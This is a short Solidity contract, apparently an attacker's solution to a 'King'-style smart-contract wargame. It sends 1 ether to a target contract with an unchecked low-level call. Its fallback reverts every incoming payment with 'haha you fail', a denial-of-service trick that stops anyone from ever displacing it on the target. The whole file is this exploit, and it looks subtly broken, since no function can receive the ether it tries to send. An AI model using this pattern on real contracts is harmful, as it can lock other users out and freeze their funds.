// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hacking {

    address instance;

    constructor(address _instance) public {
        instance = _instance;
    }

    function kinghack() public {
        address(instance).call.value(1000000000000000000)('');
    }
    
    fallback() external payable {
        revert("haha you fail");
    }
    
}